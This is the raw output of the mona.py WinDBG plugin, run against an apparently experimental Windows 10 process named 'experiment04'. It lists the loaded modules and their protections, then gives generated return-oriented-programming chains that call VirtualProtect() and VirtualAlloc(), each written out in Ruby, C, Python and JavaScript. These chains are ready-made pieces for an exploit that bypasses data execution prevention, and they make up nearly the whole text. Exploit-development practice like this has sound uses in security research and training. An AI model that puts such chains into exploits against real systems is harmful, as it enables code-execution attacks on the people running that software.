================================================================================
  Output generated by mona.py v2.0, rev 628 - WinDBG
  Corelan Consulting bv - https://www.corelan.be
================================================================================
  OS : win10, release 10.0.19044
  Process being debugged : experiment04 (pid 51880)
  Current mona arguments: D:\Windows Kits\10\Debuggers\x86\mona.py rop -m *.dll -cp nonull
================================================================================
  2022-11-19 04:35:07
================================================================================
-----------------------------------------------------------------------------------------------------------------------------------------
 Module info :
-----------------------------------------------------------------------------------------------------------------------------------------
 Base       | Top        | Size       | Rebase | SafeSEH | ASLR  | NXCompat | OS Dll | Version, Modulename & Path
-----------------------------------------------------------------------------------------------------------------------------------------
 0x759f0000 | 0x75a9f000 | 0x000af000 | True   | False   | True  |  True    | True   | 10.0.19041.1806 [COMDLG32.dll] (C:\WINDOWS\SysWOW64\COMDLG32.dll)
 0x75ef0000 | 0x75f6b000 | 0x0007b000 | True   | False   | True  |  True    | True   | 10.0.19041.789 [msvcp_win.dll] (C:\WINDOWS\SysWOW64\msvcp_win.dll)
 0x76af0000 | 0x76bd0000 | 0x000e0000 | True   | False   | True  |  True    | True   | 10.0.19041.2194 [gdi32full.dll] (C:\WINDOWS\SysWOW64\gdi32full.dll)
 0x6f360000 | 0x6f3d4000 | 0x00074000 | True   | False   | True  |  True    | True   | 10.0.19041.2193 [UxTheme.dll] (C:\WINDOWS\SysWOW64\UxTheme.dll)
 0x7a130000 | 0x7a15c000 | 0x0002c000 | True   | False   | True  |  True    | True   | 10.0.19041.746 [oledlg.dll] (C:\WINDOWS\SysWOW64\oledlg.dll)
 0x772b0000 | 0x77454000 | 0x001a4000 | True   | False   | True  |  True    | True   | 10.0.19041.2193 [ntdll.dll] (ntdll.dll)
 0x75e00000 | 0x75e76000 | 0x00076000 | True   | False   | True  |  True    | True   | 10.0.19041.1865 [sechost.dll] (C:\WINDOWS\SysWOW64\sechost.dll)
 0x00400000 | 0x010b1000 | 0x00cb1000 | False  | False   | False |  True    | False  | 1.0.0.1 [experiment04.exe] (experiment04.exe)
 0x76bd0000 | 0x76cc0000 | 0x000f0000 | True   | False   | True  |  True    | True   | 10.0.19041.2251 [KERNEL32.DLL] (C:\WINDOWS\SysWOW64\KERNEL32.DLL)
 0x711a0000 | 0x711c8000 | 0x00028000 | True   | False   | True  |  True    | True   | 10.0.19041.546 [WINMM.dll] (C:\WINDOWS\SysWOW64\WINMM.dll)
 0x75f70000 | 0x76053000 | 0x000e3000 | True   | False   | True  |  True    | True   | 10.0.19041.1202 [ole32.dll] (C:\WINDOWS\SysWOW64\ole32.dll)
 0x76aa0000 | 0x76ae5000 | 0x00045000 | True   | False   | True  |  True    | True   | 10.0.19041.2075 [SHLWAPI.dll] (C:\WINDOWS\SysWOW64\SHLWAPI.dll)
 0x75850000 | 0x759ec000 | 0x0019c000 | True   | False   | True  |  True    | True   | 10.0.19041.2251 [USER32.dll] (C:\WINDOWS\SysWOW64\USER32.dll)
 0x75c50000 | 0x75c76000 | 0x00026000 | True   | False   | True  |  True    | True   | 10.0.19041.2193 [IMM32.dll] (C:\WINDOWS\SysWOW64\IMM32.dll)
 0x76cc0000 | 0x76f40000 | 0x00280000 | True   | False   | True  |  True    | True   | 10.0.19041.2130 [combase.dll] (C:\WINDOWS\SysWOW64\combase.dll)
 0x75c80000 | 0x75d16000 | 0x00096000 | True   | False   | True  |  True    | True   | 10.0.19041.985 [OLEAUT32.dll] (C:\WINDOWS\SysWOW64\OLEAUT32.dll)
 0x76990000 | 0x769a8000 | 0x00018000 | True   | True    | True  |  True    | True   | 10.0.19041.2251 [win32u.dll] (C:\WINDOWS\SysWOW64\win32u.dll)
 0x76170000 | 0x76725000 | 0x005b5000 | True   | False   | True  |  True    | True   | 10.0.19041.2075 [SHELL32.dll] (C:\WINDOWS\SysWOW64\SHELL32.dll)
 0x76840000 | 0x768fe000 | 0x000be000 | True   | False   | True  |  True    | True   | 10.0.19041.1806 [RPCRT4.dll] (C:\WINDOWS\SysWOW64\RPCRT4.dll)
 0x760c0000 | 0x76147000 | 0x00087000 | True   | False   | True  |  True    | True   | 10.0.19041.1645 [shcore.dll] (C:\WINDOWS\SysWOW64\shcore.dll)
 0x6e5c0000 | 0x6e64d000 | 0x0008d000 | True   | False   | True  |  True    | True   | 5.82.19041.1110 [COMCTL32.dll] (C:\WINDOWS\WinSxS\x86_microsoft.windows.common-controls_6595b64144ccf1df_5.82.19041.1110_none_c0da534e38c01f4d\COMCTL32.dll)
 0x76f80000 | 0x7719c000 | 0x0021c000 | True   | False   | True  |  True    | True   | 10.0.19041.2251 [KERNELBASE.dll] (C:\WINDOWS\SysWOW64\KERNELBASE.dll)
 0x752e0000 | 0x75400000 | 0x00120000 | True   | True    | True  |  True    | True   | 10.0.19041.789 [ucrtbase.dll] (C:\WINDOWS\SysWOW64\ucrtbase.dll)
 0x76960000 | 0x76983000 | 0x00023000 | True   | True    | True  |  True    | True   | 10.0.19041.2130 [GDI32.dll] (C:\WINDOWS\SysWOW64\GDI32.dll)
 0x75aa0000 | 0x75b5f000 | 0x000bf000 | True   | False   | True  |  True    | True   | 7.0.19041.546 [msvcrt.dll] (C:\WINDOWS\SysWOW64\msvcrt.dll)
 0x74c50000 | 0x74cc3000 | 0x00073000 | True   | False   | True  |  True    | True   | 10.0.19041.2251 [WINSPOOL.DRV] (C:\WINDOWS\SysWOW64\WINSPOOL.DRV)
 0x767c0000 | 0x7683b000 | 0x0007b000 | True   | False   | True  |  True    | True   | 10.0.19041.2130 [ADVAPI32.dll] (C:\WINDOWS\SysWOW64\ADVAPI32.dll)
 0x746c0000 | 0x746c6000 | 0x00006000 | True   | True    | True  |  True    | True   | 10.0.19041.1466 [MSIMG32.dll] (C:\WINDOWS\SysWOW64\MSIMG32.dll)
 0x6d0d0000 | 0x6d237000 | 0x00167000 | True   | False   | True  |  True    | True   | 10.0.19041.2251 [gdiplus.dll] (C:\WINDOWS\WinSxS\x86_microsoft.windows.gdiplus_6595b64144ccf1df_1.1.19041.2251_none_d9513b1fe1046fc7\gdiplus.dll)
 0x74660000 | 0x746b3000 | 0x00053000 | True   | False   | True  |  True    | True   | 7.2.19041.746 [OLEACC.dll] (C:\WINDOWS\SysWOW64\OLEACC.dll)
-----------------------------------------------------------------------------------------------------------------------------------------

################################################################################

Register setup for VirtualProtect() :
--------------------------------------------
 EAX = NOP (0x90909090)
 ECX = lpOldProtect (ptr to W address)
 EDX = NewProtect (0x40)
 EBX = dwSize
 ESP = lPAddress (automatic)
 EBP = ReturnTo (ptr to jmp esp)
 ESI = ptr to VirtualProtect()
 EDI = ROP NOP (RETN)
 --- alternative chain ---
 EAX = ptr to &VirtualProtect()
 ECX = lpOldProtect (ptr to W address)
 EDX = NewProtect (0x40)
 EBX = dwSize
 ESP = lPAddress (automatic)
 EBP = POP (skip 4 bytes)
 ESI = ptr to JMP [EAX]
 EDI = ROP NOP (RETN)
 + place ptr to "jmp esp" on stack, below PUSHAD
--------------------------------------------


ROP Chain for VirtualProtect() [(XP/2003 Server and up)] :
----------------------------------------------------------

*** [ Ruby ] ***

  def create_rop_chain()

    # rop chain generated with mona.py - www.corelan.be
    rop_gadgets = 
    [
      #[---INFO:gadgets_to_set_ebp:---]
      0x7708c6f0,  # POP EBP # RETN [KERNELBASE.dll] ** REBASED ** ASLR 
      0x7708c6f0,  # skip 4 bytes [KERNELBASE.dll] ** REBASED ** ASLR
      #[---INFO:gadgets_to_set_ebx:---]
      0x758a35c0,  # POP EAX # RETN [USER32.dll] ** REBASED ** ASLR 
      0xfffffdff,  # Value to negate, will become 0x00000201
      0x76d71d4c,  # NEG EAX # RETN [combase.dll] ** REBASED ** ASLR 
      0x6d184078,  # XCHG EAX,EBX # RETN [gdiplus.dll] ** REBASED ** ASLR 
      #[---INFO:gadgets_to_set_edx:---]
      0x7467fcd0,  # POP EAX # RETN [OLEACC.dll] ** REBASED ** ASLR 
      0xffffffc0,  # Value to negate, will become 0x00000040
      0x764addcd,  # NEG EAX # RETN [SHELL32.dll] ** REBASED ** ASLR 
      0x76de9450,  # XCHG EAX,EDX # RETN [combase.dll] ** REBASED ** ASLR 
      #[---INFO:gadgets_to_set_ecx:---]
      0x6e630b9f,  # POP ECX # RETN [COMCTL32.dll] ** REBASED ** ASLR 
      0x75c6b10c,  # &Writable location [IMM32.dll] ** REBASED ** ASLR
      #[---INFO:gadgets_to_set_edi:---]
      0x7666d77a,  # POP EDI # RETN [SHELL32.dll] ** REBASED ** ASLR 
      0x76d4200c,  # RETN (ROP NOP) [combase.dll] ** REBASED ** ASLR
      #[---INFO:gadgets_to_set_esi:---]
      0x76ea6522,  # POP ESI # RETN [combase.dll] ** REBASED ** ASLR 
      0x759ff4c7,  # JMP [EAX] [COMDLG32.dll]
      0x6f3bbae9,  # POP EAX # RETN [UxTheme.dll] ** REBASED ** ASLR 
      0x76c513c4,  # ptr to &VirtualProtect() [IAT KERNEL32.DLL] ** REBASED ** ASLR
      #[---INFO:pushad:---]
      0x76ce1053,  # PUSHAD # RETN [combase.dll] ** REBASED ** ASLR 
      #[---INFO:extras:---]
      0x75a0d59c,  # ptr to 'push esp # ret ' [COMDLG32.dll] ** REBASED ** ASLR
    ].flatten.pack("V*")

    return rop_gadgets

  end


  # Call the ROP chain generator inside the 'exploit' function :


  rop_chain = create_rop_chain()



*** [ C ] ***

  #define CREATE_ROP_CHAIN(name, ...) \
    int name##_length = create_rop_chain(NULL, ##__VA_ARGS__); \
    unsigned int name[name##_length / sizeof(unsigned int)]; \
    create_rop_chain(name, ##__VA_ARGS__);

  int create_rop_chain(unsigned int *buf, unsigned int )
  {
    // rop chain generated with mona.py - www.corelan.be
    unsigned int rop_gadgets[] = {
      //[---INFO:gadgets_to_set_ebp:---]
      0x7708c6f0,  // POP EBP // RETN [KERNELBASE.dll] ** REBASED ** ASLR 
      0x7708c6f0,  // skip 4 bytes [KERNELBASE.dll] ** REBASED ** ASLR
      //[---INFO:gadgets_to_set_ebx:---]
      0x758a35c0,  // POP EAX // RETN [USER32.dll] ** REBASED ** ASLR 
      0xfffffdff,  // Value to negate, will become 0x00000201
      0x76d71d4c,  // NEG EAX // RETN [combase.dll] ** REBASED ** ASLR 
      0x6d184078,  // XCHG EAX,EBX // RETN [gdiplus.dll] ** REBASED ** ASLR 
      //[---INFO:gadgets_to_set_edx:---]
      0x7467fcd0,  // POP EAX // RETN [OLEACC.dll] ** REBASED ** ASLR 
      0xffffffc0,  // Value to negate, will become 0x00000040
      0x764addcd,  // NEG EAX // RETN [SHELL32.dll] ** REBASED ** ASLR 
      0x76de9450,  // XCHG EAX,EDX // RETN [combase.dll] ** REBASED ** ASLR 
      //[---INFO:gadgets_to_set_ecx:---]
      0x6e630b9f,  // POP ECX // RETN [COMCTL32.dll] ** REBASED ** ASLR 
      0x75c6b10c,  // &Writable location [IMM32.dll] ** REBASED ** ASLR
      //[---INFO:gadgets_to_set_edi:---]
      0x7666d77a,  // POP EDI // RETN [SHELL32.dll] ** REBASED ** ASLR 
      0x76d4200c,  // RETN (ROP NOP) [combase.dll] ** REBASED ** ASLR
      //[---INFO:gadgets_to_set_esi:---]
      0x76ea6522,  // POP ESI // RETN [combase.dll] ** REBASED ** ASLR 
      0x759ff4c7,  // JMP [EAX] [COMDLG32.dll]
      0x6f3bbae9,  // POP EAX // RETN [UxTheme.dll] ** REBASED ** ASLR 
      0x76c513c4,  // ptr to &VirtualProtect() [IAT KERNEL32.DLL] ** REBASED ** ASLR
      //[---INFO:pushad:---]
      0x76ce1053,  // PUSHAD // RETN [combase.dll] ** REBASED ** ASLR 
      //[---INFO:extras:---]
      0x75a0d59c,  // ptr to 'push esp // ret ' [COMDLG32.dll] ** REBASED ** ASLR
    };
    if(buf != NULL) {
      memcpy(buf, rop_gadgets, sizeof(rop_gadgets));
    };
    return sizeof(rop_gadgets);
  }

  // use the 'rop_chain' variable after this call, it's just an unsigned int[]
  CREATE_ROP_CHAIN(rop_chain, );
  // alternatively just allocate a large enough buffer and get the rop chain, i.e.:
  // unsigned int rop_chain[256];
  // int rop_chain_length = create_rop_chain(rop_chain, );

*** [ Python ] ***

  def create_rop_chain():

    # rop chain generated with mona.py - www.corelan.be
    rop_gadgets = [
      #[---INFO:gadgets_to_set_ebp:---]
      0x7708c6f0,  # POP EBP # RETN [KERNELBASE.dll] ** REBASED ** ASLR 
      0x7708c6f0,  # skip 4 bytes [KERNELBASE.dll] ** REBASED ** ASLR
      #[---INFO:gadgets_to_set_ebx:---]
      0x758a35c0,  # POP EAX # RETN [USER32.dll] ** REBASED ** ASLR 
      0xfffffdff,  # Value to negate, will become 0x00000201
      0x76d71d4c,  # NEG EAX # RETN [combase.dll] ** REBASED ** ASLR 
      0x6d184078,  # XCHG EAX,EBX # RETN [gdiplus.dll] ** REBASED ** ASLR 
      #[---INFO:gadgets_to_set_edx:---]
      0x7467fcd0,  # POP EAX # RETN [OLEACC.dll] ** REBASED ** ASLR 
      0xffffffc0,  # Value to negate, will become 0x00000040
      0x764addcd,  # NEG EAX # RETN [SHELL32.dll] ** REBASED ** ASLR 
      0x76de9450,  # XCHG EAX,EDX # RETN [combase.dll] ** REBASED ** ASLR 
      #[---INFO:gadgets_to_set_ecx:---]
      0x6e630b9f,  # POP ECX # RETN [COMCTL32.dll] ** REBASED ** ASLR 
      0x75c6b10c,  # &Writable location [IMM32.dll] ** REBASED ** ASLR
      #[---INFO:gadgets_to_set_edi:---]
      0x7666d77a,  # POP EDI # RETN [SHELL32.dll] ** REBASED ** ASLR 
      0x76d4200c,  # RETN (ROP NOP) [combase.dll] ** REBASED ** ASLR
      #[---INFO:gadgets_to_set_esi:---]
      0x76ea6522,  # POP ESI # RETN [combase.dll] ** REBASED ** ASLR 
      0x759ff4c7,  # JMP [EAX] [COMDLG32.dll]
      0x6f3bbae9,  # POP EAX # RETN [UxTheme.dll] ** REBASED ** ASLR 
      0x76c513c4,  # ptr to &VirtualProtect() [IAT KERNEL32.DLL] ** REBASED ** ASLR
      #[---INFO:pushad:---]
      0x76ce1053,  # PUSHAD # RETN [combase.dll] ** REBASED ** ASLR 
      #[---INFO:extras:---]
      0x75a0d59c,  # ptr to 'push esp # ret ' [COMDLG32.dll] ** REBASED ** ASLR
    ]
    return ''.join(struct.pack('<I', _) for _ in rop_gadgets)

  rop_chain = create_rop_chain()



*** [ JavaScript ] ***

  //rop chain generated with mona.py - www.corelan.be
  rop_gadgets = unescape(
    "" + // #[---INFO:gadgets_to_set_ebp:---] : 
    "%uc6f0%u7708" + // 0x7708c6f0 : ,# POP EBP # RETN [KERNELBASE.dll] ** REBASED ** ASLR 
    "%uc6f0%u7708" + // 0x7708c6f0 : ,# skip 4 bytes [KERNELBASE.dll] ** REBASED ** ASLR
    "" + // #[---INFO:gadgets_to_set_ebx:---] : 
    "%u35c0%u758a" + // 0x758a35c0 : ,# POP EAX # RETN [USER32.dll] ** REBASED ** ASLR 
    "%ufdff%uffff" + // 0xfffffdff : ,# Value to negate, will become 0x00000201
    "%u1d4c%u76d7" + // 0x76d71d4c : ,# NEG EAX # RETN [combase.dll] ** REBASED ** ASLR 
    "%u4078%u6d18" + // 0x6d184078 : ,# XCHG EAX,EBX # RETN [gdiplus.dll] ** REBASED ** ASLR 
    "" + // #[---INFO:gadgets_to_set_edx:---] : 
    "%ufcd0%u7467" + // 0x7467fcd0 : ,# POP EAX # RETN [OLEACC.dll] ** REBASED ** ASLR 
    "%uffc0%uffff" + // 0xffffffc0 : ,# Value to negate, will become 0x00000040
    "%uddcd%u764a" + // 0x764addcd : ,# NEG EAX # RETN [SHELL32.dll] ** REBASED ** ASLR 
    "%u9450%u76de" + // 0x76de9450 : ,# XCHG EAX,EDX # RETN [combase.dll] ** REBASED ** ASLR 
    "" + // #[---INFO:gadgets_to_set_ecx:---] : 
    "%u0b9f%u6e63" + // 0x6e630b9f : ,# POP ECX # RETN [COMCTL32.dll] ** REBASED ** ASLR 
    "%ub10c%u75c6" + // 0x75c6b10c : ,# &Writable location [IMM32.dll] ** REBASED ** ASLR
    "" + // #[---INFO:gadgets_to_set_edi:---] : 
    "%ud77a%u7666" + // 0x7666d77a : ,# POP EDI # RETN [SHELL32.dll] ** REBASED ** ASLR 
    "%u200c%u76d4" + // 0x76d4200c : ,# RETN (ROP NOP) [combase.dll] ** REBASED ** ASLR
    "" + // #[---INFO:gadgets_to_set_esi:---] : 
    "%u6522%u76ea" + // 0x76ea6522 : ,# POP ESI # RETN [combase.dll] ** REBASED ** ASLR 
    "%uf4c7%u759f" + // 0x759ff4c7 : ,# JMP [EAX] [COMDLG32.dll]
    "%ubae9%u6f3b" + // 0x6f3bbae9 : ,# POP EAX # RETN [UxTheme.dll] ** REBASED ** ASLR 
    "%u13c4%u76c5" + // 0x76c513c4 : ,# ptr to &VirtualProtect() [IAT KERNEL32.DLL] ** REBASED ** ASLR
    "" + // #[---INFO:pushad:---] : 
    "%u1053%u76ce" + // 0x76ce1053 : ,# PUSHAD # RETN [combase.dll] ** REBASED ** ASLR 
    "" + // #[---INFO:extras:---] : 
    "%ud59c%u75a0" + // 0x75a0d59c : ,# ptr to 'push esp # ret ' [COMDLG32.dll] ** REBASED ** ASLR
    ""); //  : 


--------------------------------------------------------------------------------------------------


################################################################################

Register setup for VirtualAlloc() :
--------------------------------------------
 EAX = NOP (0x90909090)
 ECX = flProtect (0x40)
 EDX = flAllocationType (0x1000)
 EBX = dwSize
 ESP = lpAddress (automatic)
 EBP = ReturnTo (ptr to jmp esp)
 ESI = ptr to VirtualAlloc()
 EDI = ROP NOP (RETN)
 --- alternative chain ---
 EAX = ptr to &VirtualAlloc()
 ECX = flProtect (0x40)
 EDX = flAllocationType (0x1000)
 EBX = dwSize
 ESP = lpAddress (automatic)
 EBP = POP (skip 4 bytes)
 ESI = ptr to JMP [EAX]
 EDI = ROP NOP (RETN)
 + place ptr to "jmp esp" on stack, below PUSHAD
--------------------------------------------


ROP Chain for VirtualAlloc() [(XP/2003 Server and up)] :
--------------------------------------------------------

*** [ Ruby ] ***

  def create_rop_chain()

    # rop chain generated with mona.py - www.corelan.be
    rop_gadgets = 
    [
      #[---INFO:gadgets_to_set_ebp:---]
      0x7536bdea,  # POP EBP # RETN [ucrtbase.dll] ** REBASED ** ASLR 
      0x7536bdea,  # skip 4 bytes [ucrtbase.dll] ** REBASED ** ASLR
      #[---INFO:gadgets_to_set_ebx:---]
      0x75ccf205,  # POP EAX # RETN [OLEAUT32.dll] ** REBASED ** ASLR 
      0xffffffff,  # Value to negate, will become 0x00000001
      0x6d19c233,  # NEG EAX # RETN [gdiplus.dll] ** REBASED ** ASLR 
      0x765df52b,  # XCHG EAX,EBX # RETN [SHELL32.dll] ** REBASED ** ASLR 
      #[---INFO:gadgets_to_set_edx:---]
      0x770b0572,  # POP EAX # RETN [KERNELBASE.dll] ** REBASED ** ASLR 
      0x8ad08a98,  # put delta into eax (-> put 0x00001000 into edx)
      0x75348046,  # ADD EAX,752F8568 # RETN [ucrtbase.dll] ** REBASED ** ASLR 
      0x75cf197b,  # XCHG EAX,EDX # RETN [OLEAUT32.dll] ** REBASED ** ASLR 
      #[---INFO:gadgets_to_set_ecx:---]
      0x76116389,  # POP EAX # RETN [shcore.dll] ** REBASED ** ASLR 
      0xffffffc0,  # Value to negate, will become 0x00000040
      0x758a3f6f,  # NEG EAX # RETN [USER32.dll] ** REBASED ** ASLR 
      0x76d505cf,  # XCHG EAX,ECX # RETN [combase.dll] ** REBASED ** ASLR 
      #[---INFO:gadgets_to_set_edi:---]
      0x768b8bf9,  # POP EDI # RETN [RPCRT4.dll] ** REBASED ** ASLR 
      0x76d4200c,  # RETN (ROP NOP) [combase.dll] ** REBASED ** ASLR
      #[---INFO:gadgets_to_set_esi:---]
      0x7537fda3,  # POP ESI # RETN [ucrtbase.dll] ** REBASED ** ASLR 
      0x759ff4c7,  # JMP [EAX] [COMDLG32.dll]
      0x75b3782f,  # POP EAX # RETN [msvcrt.dll] ** REBASED ** ASLR 
      0x758f9310,  # ptr to &VirtualAlloc() [IAT USER32.dll] ** REBASED ** ASLR
      #[---INFO:pushad:---]
      0x6d1a21b9,  # PUSHAD # RETN [gdiplus.dll] ** REBASED ** ASLR 
      #[---INFO:extras:---]
      0x75a0d59c,  # ptr to 'push esp # ret ' [COMDLG32.dll] ** REBASED ** ASLR
    ].flatten.pack("V*")

    return rop_gadgets

  end


  # Call the ROP chain generator inside the 'exploit' function :


  rop_chain = create_rop_chain()



*** [ C ] ***

  #define CREATE_ROP_CHAIN(name, ...) \
    int name##_length = create_rop_chain(NULL, ##__VA_ARGS__); \
    unsigned int name[name##_length / sizeof(unsigned int)]; \
    create_rop_chain(name, ##__VA_ARGS__);

  int create_rop_chain(unsigned int *buf, unsigned int )
  {
    // rop chain generated with mona.py - www.corelan.be
    unsigned int rop_gadgets[] = {
      //[---INFO:gadgets_to_set_ebp:---]
      0x7536bdea,  // POP EBP // RETN [ucrtbase.dll] ** REBASED ** ASLR 
      0x7536bdea,  // skip 4 bytes [ucrtbase.dll] ** REBASED ** ASLR
      //[---INFO:gadgets_to_set_ebx:---]
      0x75ccf205,  // POP EAX // RETN [OLEAUT32.dll] ** REBASED ** ASLR 
      0xffffffff,  // Value to negate, will become 0x00000001
      0x6d19c233,  // NEG EAX // RETN [gdiplus.dll] ** REBASED ** ASLR 
      0x765df52b,  // XCHG EAX,EBX // RETN [SHELL32.dll] ** REBASED ** ASLR 
      //[---INFO:gadgets_to_set_edx:---]
      0x770b0572,  // POP EAX // RETN [KERNELBASE.dll] ** REBASED ** ASLR 
      0x8ad08a98,  // put delta into eax (-> put 0x00001000 into edx)
      0x75348046,  // ADD EAX,752F8568 // RETN [ucrtbase.dll] ** REBASED ** ASLR 
      0x75cf197b,  // XCHG EAX,EDX // RETN [OLEAUT32.dll] ** REBASED ** ASLR 
      //[---INFO:gadgets_to_set_ecx:---]
      0x76116389,  // POP EAX // RETN [shcore.dll] ** REBASED ** ASLR 
      0xffffffc0,  // Value to negate, will become 0x00000040
      0x758a3f6f,  // NEG EAX // RETN [USER32.dll] ** REBASED ** ASLR 
      0x76d505cf,  // XCHG EAX,ECX // RETN [combase.dll] ** REBASED ** ASLR 
      //[---INFO:gadgets_to_set_edi:---]
      0x768b8bf9,  // POP EDI // RETN [RPCRT4.dll] ** REBASED ** ASLR 
      0x76d4200c,  // RETN (ROP NOP) [combase.dll] ** REBASED ** ASLR
      //[---INFO:gadgets_to_set_esi:---]
      0x7537fda3,  // POP ESI // RETN [ucrtbase.dll] ** REBASED ** ASLR 
      0x759ff4c7,  // JMP [EAX] [COMDLG32.dll]
      0x75b3782f,  // POP EAX // RETN [msvcrt.dll] ** REBASED ** ASLR 
      0x758f9310,  // ptr to &VirtualAlloc() [IAT USER32.dll] ** REBASED ** ASLR
      //[---INFO:pushad:---]
      0x6d1a21b9,  // PUSHAD // RETN [gdiplus.dll] ** REBASED ** ASLR 
      //[---INFO:extras:---]
      0x75a0d59c,  // ptr to 'push esp // ret ' [COMDLG32.dll] ** REBASED ** ASLR
    };
    if(buf != NULL) {
      memcpy(buf, rop_gadgets, sizeof(rop_gadgets));
    };
    return sizeof(rop_gadgets);
  }

  // use the 'rop_chain' variable after this call, it's just an unsigned int[]
  CREATE_ROP_CHAIN(rop_chain, );
  // alternatively just allocate a large enough buffer and get the rop chain, i.e.:
  // unsigned int rop_chain[256];
  // int rop_chain_length = create_rop_chain(rop_chain, );

*** [ Python ] ***

  def create_rop_chain():

    # rop chain generated with mona.py - www.corelan.be
    rop_gadgets = [
      #[---INFO:gadgets_to_set_ebp:---]
      0x7536bdea,  # POP EBP # RETN [ucrtbase.dll] ** REBASED ** ASLR 
      0x7536bdea,  # skip 4 bytes [ucrtbase.dll] ** REBASED ** ASLR
      #[---INFO:gadgets_to_set_ebx:---]
      0x75ccf205,  # POP EAX # RETN [OLEAUT32.dll] ** REBASED ** ASLR 
      0xffffffff,  # Value to negate, will become 0x00000001
      0x6d19c233,  # NEG EAX # RETN [gdiplus.dll] ** REBASED ** ASLR 
      0x765df52b,  # XCHG EAX,EBX # RETN [SHELL32.dll] ** REBASED ** ASLR 
      #[---INFO:gadgets_to_set_edx:---]
      0x770b0572,  # POP EAX # RETN [KERNELBASE.dll] ** REBASED ** ASLR 
      0x8ad08a98,  # put delta into eax (-> put 0x00001000 into edx)
      0x75348046,  # ADD EAX,752F8568 # RETN [ucrtbase.dll] ** REBASED ** ASLR 
      0x75cf197b,  # XCHG EAX,EDX # RETN [OLEAUT32.dll] ** REBASED ** ASLR 
      #[---INFO:gadgets_to_set_ecx:---]
      0x76116389,  # POP EAX # RETN [shcore.dll] ** REBASED ** ASLR 
      0xffffffc0,  # Value to negate, will become 0x00000040
      0x758a3f6f,  # NEG EAX # RETN [USER32.dll] ** REBASED ** ASLR 
      0x76d505cf,  # XCHG EAX,ECX # RETN [combase.dll] ** REBASED ** ASLR 
      #[---INFO:gadgets_to_set_edi:---]
      0x768b8bf9,  # POP EDI # RETN [RPCRT4.dll] ** REBASED ** ASLR 
      0x76d4200c,  # RETN (ROP NOP) [combase.dll] ** REBASED ** ASLR
      #[---INFO:gadgets_to_set_esi:---]
      0x7537fda3,  # POP ESI # RETN [ucrtbase.dll] ** REBASED ** ASLR 
      0x759ff4c7,  # JMP [EAX] [COMDLG32.dll]
      0x75b3782f,  # POP EAX # RETN [msvcrt.dll] ** REBASED ** ASLR 
      0x758f9310,  # ptr to &VirtualAlloc() [IAT USER32.dll] ** REBASED ** ASLR
      #[---INFO:pushad:---]
      0x6d1a21b9,  # PUSHAD # RETN [gdiplus.dll] ** REBASED ** ASLR 
      #[---INFO:extras:---]
      0x75a0d59c,  # ptr to 'push esp # ret ' [COMDLG32.dll] ** REBASED ** ASLR
    ]
    return ''.join(struct.pack('<I', _) for _ in rop_gadgets)

  rop_chain = create_rop_chain()



*** [ JavaScript ] ***

  //rop chain generated with mona.py - www.corelan.be
  rop_gadgets = unescape(
    "" + // #[---INFO:gadgets_to_set_ebp:---] : 
    "%ubdea%u7536" + // 0x7536bdea : ,# POP EBP # RETN [ucrtbase.dll] ** REBASED ** ASLR 
    "%ubdea%u7536" + // 0x7536bdea : ,# skip 4 bytes [ucrtbase.dll] ** REBASED ** ASLR
    "" + // #[---INFO:gadgets_to_set_ebx:---] : 
    "%uf205%u75cc" + // 0x75ccf205 : ,# POP EAX # RETN [OLEAUT32.dll] ** REBASED ** ASLR 
    "%uffff%uffff" + // 0xffffffff : ,# Value to negate, will become 0x00000001
    "%uc233%u6d19" + // 0x6d19c233 : ,# NEG EAX # RETN [gdiplus.dll] ** REBASED ** ASLR 
    "%uf52b%u765d" + // 0x765df52b : ,# XCHG EAX,EBX # RETN [SHELL32.dll] ** REBASED ** ASLR 
    "" + // #[---INFO:gadgets_to_set_edx:---] : 
    "%u0572%u770b" + // 0x770b0572 : ,# POP EAX # RETN [KERNELBASE.dll] ** REBASED ** ASLR 
    "%u8a98%u8ad0" + // 0x8ad08a98 : ,# put delta into eax (-> put 0x00001000 into edx)
    "%u8046%u7534" + // 0x75348046 : ,# ADD EAX,752F8568 # RETN [ucrtbase.dll] ** REBASED ** ASLR 
    "%u197b%u75cf" + // 0x75cf197b : ,# XCHG EAX,EDX # RETN [OLEAUT32.dll] ** REBASED ** ASLR 
    "" + // #[---INFO:gadgets_to_set_ecx:---] : 
    "%u6389%u7611" + // 0x76116389 : ,# POP EAX # RETN [shcore.dll] ** REBASED ** ASLR 
    "%uffc0%uffff" + // 0xffffffc0 : ,# Value to negate, will become 0x00000040
    "%u3f6f%u758a" + // 0x758a3f6f : ,# NEG EAX # RETN [USER32.dll] ** REBASED ** ASLR 
    "%u05cf%u76d5" + // 0x76d505cf : ,# XCHG EAX,ECX # RETN [combase.dll] ** REBASED ** ASLR 
    "" + // #[---INFO:gadgets_to_set_edi:---] : 
    "%u8bf9%u768b" + // 0x768b8bf9 : ,# POP EDI # RETN [RPCRT4.dll] ** REBASED ** ASLR 
    "%u200c%u76d4" + // 0x76d4200c : ,# RETN (ROP NOP) [combase.dll] ** REBASED ** ASLR
    "" + // #[---INFO:gadgets_to_set_esi:---] : 
    "%ufda3%u7537" + // 0x7537fda3 : ,# POP ESI # RETN [ucrtbase.dll] ** REBASED ** ASLR 
    "%uf4c7%u759f" + // 0x759ff4c7 : ,# JMP [EAX] [COMDLG32.dll]
    "%u782f%u75b3" + // 0x75b3782f : ,# POP EAX # RETN [msvcrt.dll] ** REBASED ** ASLR 
    "%u9310%u758f" + // 0x758f9310 : ,# ptr to &VirtualAlloc() [IAT USER32.dll] ** REBASED ** ASLR
    "" + // #[---INFO:pushad:---] : 
    "%u21b9%u6d1a" + // 0x6d1a21b9 : ,# PUSHAD # RETN [gdiplus.dll] ** REBASED ** ASLR 
    "" + // #[---INFO:extras:---] : 
    "%ud59c%u75a0" + // 0x75a0d59c : ,# ptr to 'push esp # ret ' [COMDLG32.dll] ** REBASED ** ASLR
    ""); //  : 


--------------------------------------------------------------------------------------------------

